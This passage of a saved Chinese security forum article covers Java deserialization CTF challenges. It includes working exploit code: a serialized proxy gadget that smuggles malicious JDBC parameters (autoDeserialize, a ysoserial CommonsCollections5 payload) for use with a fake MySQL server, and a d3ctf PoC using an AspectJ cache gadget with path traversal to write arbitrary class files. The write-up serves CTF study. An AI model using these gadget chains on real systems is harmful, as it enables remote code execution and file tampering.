+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Proxy</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Base64</span><span class="o">;</span>
+<span class="cm">/*</span>
+<span class="cm">info.getAllInfo()</span>
+<span class="cm">    InfoInvocationHandler.invoke()</span>
+<span class="cm">        DatabaseInfo.checkAllInfo()</span>
+<span class="cm">            DatabaseInfo.connect() //配合jdbc的反序列化</span>
+<span class="cm"> */</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">exp</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">DatabaseInfo</span> <span class="n">databaseInfo</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DatabaseInfo</span><span class="o">();</span>
+        <span class="n">databaseInfo</span><span class="o">.</span><span class="na">setHost</span><span class="o">(</span><span class="s">"127.0.0.1"</span><span class="o">);</span>
+        <span class="n">databaseInfo</span><span class="o">.</span><span class="na">setPort</span><span class="o">(</span><span class="s">"3306"</span><span class="o">);</span>
+        <span class="n">databaseInfo</span><span class="o">.</span><span class="na">setUsername</span><span class="o">(</span><span class="s">"yso_CommonsCollections5_calc"</span><span class="o">);</span>
+        <span class="n">databaseInfo</span><span class="o">.</span><span class="na">setPassword</span><span class="o">(</span><span class="s">"123&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor"</span><span class="o">);</span>
+
+        <span class="n">ClassLoader</span> <span class="n">classLoader</span> <span class="o">=</span> <span class="n">databaseInfo</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">();</span>
+        <span class="n">Class</span><span class="o">[]</span> <span class="n">interfaces</span> <span class="o">=</span> <span class="n">databaseInfo</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getInterfaces</span><span class="o">();</span>
+        <span class="n">InfoInvocationHandler</span> <span class="n">infoInvocationHandler</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InfoInvocationHandler</span><span class="o">(</span><span class="n">databaseInfo</span><span class="o">);</span>
+        <span class="n">Info</span> <span class="n">proxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Info</span><span class="o">)</span><span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">classLoader</span><span class="o">,</span><span class="n">interfaces</span><span class="o">,</span><span class="n">infoInvocationHandler</span><span class="o">);</span>
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="o">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">objectOutputStream</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="o">(</span><span class="n">baos</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">proxy</span><span class="o">);</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">flush</span><span class="o">();</span>
+        <span class="n">objectOutputStream</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">printf</span><span class="o">(</span><span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">Base64</span><span class="o">.</span><span class="na">getEncoder</span><span class="o">().</span><span class="na">encode</span><span class="o">(</span><span class="n">baos</span><span class="o">.</span><span class="na">toByteArray</span><span class="o">())));</span>
+
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<h6>运行题目和启动fake_server，然后修改cookie值方法hello的路由就可以成功命令执行</h6>
+<p><a id="img12" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162901-d1fd6672-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162901-d1fd6672-8bb1-1.png"></a><br>
+<a id="img13" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162901-d22753b0-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162901-d22753b0-8bb1-1.png"></a><br>
+<a id="img14" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162902-d27a72ac-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162902-d27a72ac-8bb1-1.png"></a><br>
+<a id="img15" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162902-d2c72c1e-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162902-d2c72c1e-8bb1-1.png"></a></p>
+<h6>现在来看看d3ctf的那个java反序列化题，这里面主要是反射用的多，主要讲反序列化，所以前面2层的绕过就没有必要说明了，直接看看反序列化的流程：</h6>
+<p><a id="img16" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162902-d2f5ea0e-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162902-d2f5ea0e-8bb1-1.png"></a><br>
+<a id="img17" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162903-d31f606e-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162903-d31f606e-8bb1-1.png"></a><br>
+<a id="img18" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162903-d34365fe-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162903-d34365fe-8bb1-1.png"></a><br>
+<a id="img19" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162903-d3646934-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162903-d3646934-8bb1-1.png"></a><br>
+<a id="img20" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162905-d4bd1100-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162905-d4bd1100-8bb1-1.png"></a><br>
+<a id="img21" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162906-d4e50dc2-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162906-d4e50dc2-8bb1-1.png"></a></p>
+<h6>然后来构造poc，这里的poc和nu1l差不多，因为当时比赛没有做出来，后来复现的，生成poc时得把DataMap的Entry里面的hashCode方法直接改成return 1; 这么做的目的是为了让生成poc时不修改我们已经构造好的类</h6>
+<p><a id="img22" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162906-d5095c18-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162906-d5095c18-8bb1-1.png"></a></p>
+
+<pre><code>package launch;
+import checker.DataMap;
+import java.io.*;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+
+
+/**
+ HashSet.readObject()
+ HashMap.put()
+ HashMap.hash()
+ DataMap$Entry.hashcode
+ DataMap$Entry.getValue()
+ DataMap.get()
+ SimpleCache$StorableCachingMap.put()
+ SimpleCache$StorableCachingMap.writeToPath()
+ FileOutputStream.write()
+ */
+public class poc {
+    public static Serializable getGadget() throws Exception {
+
+        byte[] content_byte = Files.readAllBytes(new File("D:\\dk\\d3\\www_1385f769c3bd9b2489b828ce25238f3dee4ff4f16f\\Exp.class").toPath());
+        String file_name = "../../../../../../../../../../../../../../aaaaaaa.class";
+        Constructor aspectjConstructor = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap").getDeclaredConstructors()[0];
+        aspectjConstructor.setAccessible(true);
+        Object simpleCache = aspectjConstructor.newInstance(".", 12);//这里就用到了前面的内部公有类实例化
+
+        HashMap wrapperMap = new HashMap();
+        wrapperMap.put(file_name, content_byte);
+
+        DataMap dataMap = new DataMap(wrapperMap, (Map) simpleCache);
+
+        Constructor[] entryConstructor = Class.forName("checker.DataMap$Entry").getDeclaredConstructors();
+        entryConstructor[0].setAccessible(true);
+        Object entry = entryConstructor[0].newInstance(dataMap, file_name);//这里就用到了前面的私有内部类的实例化方式
+
+        HashSet map = new HashSet(1);
+        map.add(entry);//nu1l这之后的操作就是为了修改这个值，目的也是防止add时修改我们已经构造好的类
+
+        ObjectOutputStream o = new ObjectOutputStream(new FileOutputStream("Object.obj2"));
+        o.writeObject(map);
+        o.flush();
+        o.close();
+
+        return 1;
+    }
+
+    public static void main(String[] args) throws Exception {
+        getGadget();
+    }
+}</code></pre>
+<h6>好了现在把之前改了的hashCode方法改回来，然后反序列化生成的poc</h6>
+<p><a id="img23" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162906-d544866c-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162906-d544866c-8bb1-1.png"></a></p>
+<div class="highlight"><pre><span></span><span class="kn">package</span> <span class="nn">launch</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">checker.DataMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Constructor</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.nio.file.Files</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="o">;</span>
+
+
+<span class="cm">/**</span>
+<span class="cm"> HashSet.readObject()</span>
+<span class="cm"> HashMap.put()</span>
+<span class="cm"> HashMap.hash()</span>
+<span class="cm"> DataMap$Entry.hashcode</span>
+<span class="cm"> DataMap$Entry.getValue()</span>
+<span class="cm"> DataMap.get()</span>
+<span class="cm"> SimpleCache$StorableCachingMap.put()</span>
+<span class="cm"> SimpleCache$StorableCachingMap.writeToPath()</span>
+<span class="cm"> FileOutputStream.write()</span>
+<span class="cm"> */</span>
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">poc</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="n">Serializable</span> <span class="nf">getGadget</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+
+        <span class="kt">byte</span><span class="o">[]</span> <span class="n">content_byte</span> <span class="o">=</span> <span class="n">Files</span><span class="o">.</span><span class="na">readAllBytes</span><span class="o">(</span><span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"D:\\dk\\d3\\www_1385f769c3bd9b2489b828ce25238f3dee4ff4f16f\\Exp.class"</span><span class="o">).</span><span class="na">toPath</span><span class="o">());</span>
+        <span class="n">String</span> <span class="n">file_name</span> <span class="o">=</span> <span class="s">"../../../../../../../../../../../../../../aaaaaaa.class"</span><span class="o">;</span>
+        <span class="n">Constructor</span> <span class="n">aspectjConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap"</span><span class="o">).</span><span class="na">getDeclaredConstructors</span><span class="o">()[</span><span class="mi">0</span><span class="o">];</span>
+        <span class="n">aspectjConstructor</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">simpleCache</span> <span class="o">=</span> <span class="n">aspectjConstructor</span><span class="o">.</span><span class="na">newInstance</span><span class="o">(</span><span class="s">"."</span><span class="o">,</span> <span class="mi">12</span><span class="o">);</span><span class="c1">//这里就用到了前面的内部公有类实例化</span>
+
+        <span class="n">HashMap</span> <span class="n">wrapperMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">();</span>
+        <span class="n">wrapperMap</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">file_name</span><span class="o">,</span> <span class="n">content_byte</span><span class="o">);</span>
+
+        <span class="n">DataMap</span> <span class="n">dataMap</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DataMap</span><span class="o">(</span><span class="n">wrapperMap</span><span class="o">,</span> <span class="o">(</span><span class="n">Map</span><span class="o">)</span> <span class="n">simpleCache</span><span class="o">);</span>
+
+        <span class="n">Constructor</span><span class="o">[]</span> <span class="n">entryConstructor</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">"checker.DataMap$Entry"</span><span class="o">).</span><span class="na">getDeclaredConstructors</span><span class="o">();</span>
+        <span class="n">entryConstructor</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
+        <span class="n">Object</span> <span class="n">entry</span> <span class="o">=</span> <span class="n">entryConstructor</span><span class="o">[</span><span class="mi">0</span><span class="o">].</span><span class="na">newInstance</span><span class="o">(</span><span class="n">dataMap</span><span class="o">,</span> <span class="n">file_name</span><span class="o">);</span><span class="c1">//这里就用到了前面的私有内部类的实例化方式</span>
+
+        <span class="n">HashSet</span> <span class="n">map</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashSet</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
+        <span class="n">map</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">entry</span><span class="o">);</span>
+
+        <span class="n">File</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="s">"Object.obj2"</span><span class="o">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="o">(</span><span class="k">new</span> <span class="n">FileInputStream</span><span class="o">(</span><span class="n">file</span><span class="o">));</span>
+        <span class="n">Object</span> <span class="n">newUser</span> <span class="o">=</span> <span class="o">(</span><span class="n">Object</span><span class="o">)</span><span class="n">ois</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+
+        <span class="k">return</span> <span class="mi">1</span><span class="o">;</span>
+    <span class="o">}</span>
+
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="n">getGadget</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<h6>然后就可以看到所运行盘符的目录下面成功写入文件</h6>
+<p><a id="img24" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162907-d59058b2-8bb1-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210323162907-d59058b2-8bb1-1.png"></a></p>
+
+            </div>
+            
+
+            <div class="post-user-action" style="margin-top: 34px;">
+                <span class="btn btn-default pull-right" id="mark" data-action="topic" data-pk="9342">
+                    <span id="mark-text">点击收藏 </span><span class="i-seprator"> | </span><span id="mark-count">2</span>
+                </span>
+                
+                    <span class="btn btn-default pull-right" id="follow_topic" data-pk="9342">
+                     <span>关注</span><span class="i-seprator"> | </span><span id="follow-count">1</span>
+                    </span>
+                
+                <div class="clearfix"></div>
+            </div>
+            
+                <div class="related-section">
+                    <div class="related-box">
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/9328" title="小白对彩虹猫的简单分析"><span class="related-label" style="padding: 3px 4px;margin-right: 3px;">上一篇：</span>小白对彩虹猫的简单分析</a></span>
+                        
+                        
+                            <span><a class="pull-left" href="https://xz.aliyun.com/t/9343" title="使用 CVE-2020-2555 攻击 Shiro"><span class="related-label" style="">下一篇：</span>使用 CVE-2020-2555 ...</a></span>
+                        
+                    </div>
+                </div>
+            
+        </div>
+    </div>
+</div>
+
+    <!-- topic & appendix -->
+    
+
+
+
+<div class="row box">
+    <ol class="breadcrumb">
+        <li class="active">5 条回复</li>
+    </ol>
+    <div class="box-container post-container">
+        
+            
+                <ul class="post-info" id="reply-16398">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/33827">黑伞</a>
+                                
+                                <span class="bbs-time">2021-03-31 15:40:12</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>可以给个转发公众号的权限吗 表哥</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="16398" data-topic="9342"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="黑伞">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-16402">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/36877">123qwer</a>
+                                
+                                <span class="bbs-time">2021-04-01 11:55:48</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p><a href="https://xz.aliyun.com/u/33827" target="_blank">@黑伞</a></p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="16402" data-topic="9342"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="123qwer">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-16403">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/36877">123qwer</a>
+                                
+                                <span class="bbs-time">2021-04-01 11:56:52</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p><a href="https://xz.aliyun.com/u/33827" target="_blank">@黑伞</a></p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="16403" data-topic="9342"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="123qwer">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-16404">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/36877">123qwer</a>
+                                
+                                <span class="bbs-time">2021-04-01 11:58:10</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>我个人没有问题，前提只要不违反先知这里的规则</p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="16404" data-topic="9342"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="123qwer">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+                <ul class="post-info" id="reply-16416">
+                    <li>
+                        <div class="row1 user-info clearfix">
+                            
+                                <img class="avatar pull-left tiny-avatar" src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                            <span class="post-info ">
+                                 
+                                <a class="label label-default" href="https://xz.aliyun.com/u/29798">何止</a>
+                                
+                                <span class="bbs-time">2021-04-03 21:16:46</span>
+                                
+                            </span>
+                            <div class="post-content markdown-body">
+                                <p>师傅d3的那个调用的是writetopath<br>
+<a id="img25" href="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210403211609-c112ec80-947e-1.png"><img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/20210403211609-c112ec80-947e-1.png"></a></p>
+
+                            </div>
+                            <div class="manual-box">
+                                <span class="thumbs " data-action="post" data-pk="16416" data-topic="9342"><i class="fa fa-thumbs-o-up"></i><span>0</span></span>
+                                <span class="reply-jump reply reply-count " data-nickname="何止">回复Ta</span>
+                            </div>
+                        </div>
+
+                        <hr>
+                    </li>
+                </ul>
+            
+        
+    </div>
+</div>
+
+
+    <!-- posts of topic -->
+    
+        <div class="row box" id="reply-box">
+            
+            <div class="box-container clearfix">
+                
+                    <div class="reminder">
+                        <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9342&amp;from_type=xianzhi"><strong>登录</strong></a> 后跟帖
+                    </div>
+                
+            </div>
+        </div>
+    
+    <!-- editor for post -->
+    
+
+        </div>
+        <div class="span3 pull-right offset sidebar">
+            
+
+
+    <div class="box">
+        <div class="info-panel">
+            <p><strong>先知社区</strong></p>
+            <hr>
+            <p class="text-center login-btn">
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9342&amp;from_type=xianzhi" class="btn">现在登录</a>
+            </p>
+        </div>
+    </div>
+
+
+
+    <div class="box">
+        <div class="hot-node notice">
+            <div class="info-body">
+                <a href="https://xz.aliyun.com/notice" style="padding: 4px 10px 4px 10px;">社区小黑板</a>
+            </div>
+        </div>
+    </div>
+
+
+<div class="box">
+    <div class="global-charts">
+        <div id="chart-header">
+            <div class="col-sm-4 text-center charts" data-type="year">
+                年度贡献榜
+            </div>
+            <div class="text-center charts active" data-type="month">
+                月度贡献榜
+            </div>
+            <div class="clearfix"></div>
+        </div>
+        <div id="chart_body">
+            <div class="info-body" data-type="year">
+
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/37846_ed0c5102d8f11328a1.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/37846" title="儒道易行">儒道易行</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">54</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64113" title="Ic4_F1ame">Ic4_F1ame</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/64530" title="OpenSCA社区">OpenSCA社区</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/61452" title="遇见已经是最大的幸运">遇见已经是最大的幸运</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">9</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+                    <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49027" title="hacker和小黑">hacker和小黑</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">8</span>
+                            </span>
+                        </div>
+
+                    </div>
+                
+            </div>
+            <div class="info-body" data-type="month">
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/15858_1a385b86ba5eb88d54.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/15858" title="pic4xiu" style="">pic4xiu</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">4</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/54941" title="1794205309262390" style="">1794205309262390</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">3</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/49315_e954e2786775c5324a.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49315" title="倩倩大魔王" style="">倩倩大魔王</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/49710" title="忘川安全" style="">忘川安全</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">2</span>
+                            </span>
+                        </div>
+                    </div>
+                
+                     <div class="member">
+                        <div class="pull-left chart-avatar">
+                            
+                                <img src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/default_avatar.png">
+                            
+                        </div>
+                        <div class="chart-name">
+                            <a class="nickname" href="https://xz.aliyun.com/u/70845" title="1000303887847998" style="">1000303887847998</a>
+                            <span class="num-box">
+                                <span class="badge badge-important">1</span>
+                            </span>
+                        </div>
+                    </div>
+                
+            </div>
+        </div>
+
+    </div>
+</div>
+
+    <div class="box" id="toc-container" style="width: 258px;">
+        <div class="panel-info">
+            <div class="panel-heading">
+                <h4>目录</h4>
+            </div>
+            <div id="toc">
+                <div class="high-light" style="display: block;background-color: #f3f3f3;position: absolute;"></div>
+            <ol><li><a href="https://xz.aliyun.com/t/9342#toc-0">java反序列化知识总结和一些ctf的例题</a></li></ol></div>
+        </div>
+    </div>
+    <div style="clear: both;"></div>
+
+
+    <script type="text/javascript">
+        $(function () {
+            $(".charts").click(switchChart);
+            $("[data-toggle='tooltip']").tooltip();
+
+            function switchChart() {
+                let _this = $(this);
+                let idx = _this.attr("data-type")
+                let content = $(`#chart_body>.info-body[data-type='${idx}']`)
+                if (!_this.hasClass("active")) {
+                    _this.addClass("active").siblings().removeClass("active")
+                    content.show().siblings().hide()
+                }
+            }
+        })
+    </script>
+
+
+    <style>
+
+    </style>
+
+
+        </div>
+    </div>
+
+
+</div>
+<footer class="bs-docs-footer" translate="no">
+    <div class="container text-center">
+        <div class="links">
+            <a href="https://xz.aliyun.com/feed" target="_blank">RSS</a>
+            <a href="https://xz.aliyun.com/about" target="_blank"><span>关于社区</span></a>
+            <a href="https://xz.aliyun.com/partner" target="_blank"><span>友情链接</span></a>
+            <a href="https://xz.aliyun.com/notice">社区小黑板</a>
+            <a href="https://report.aliyun.com/" target="_blank">举报中心</a>
+            <a href="https://www.aliyun.com/complaint" target="_blank">我要投诉</a>
+        </div>
+    </div>
+</footer>
+
+<script src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/bootstrap.min.js.下载"></script>
+<script src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/xz.js.下载"></script>
+
+
+    
+    <script type="text/javascript">
+        $(document).ready(function () {
+            voteUp = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/up/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9342&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-up').html(data.html);
+                                }
+                            }
+                        }
+                    });
+                }
+            };
+            voteDown = function (topicPk) {
+                if (topicPk) {
+                    $.ajax({
+                        url: '/forum/topic/down/',
+                        data: {'pk': topicPk},
+                        type: 'post',
+                        dataType: 'json',
+                        success: function (data) {
+                            if (data.not_authenticated) {
+                                window.location.href = 'https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F9342&amp;from_type=xianzhi'
+                            } else {
+                                if (data.success) {
+                                    $('.t-vote > .vote-down').html(data.html);
+                                }
+                            }
+
+                        }
+                    });
+                }
+            };
+            
+            $("[data-toggle='tooltip']").tooltip();
+        });
+    </script>
+
+
+    <script src="./java反序列化知识总结和一些ctf的例题 - 先知社区_files/z_stat.php"></script>
+
+
+</body></html>
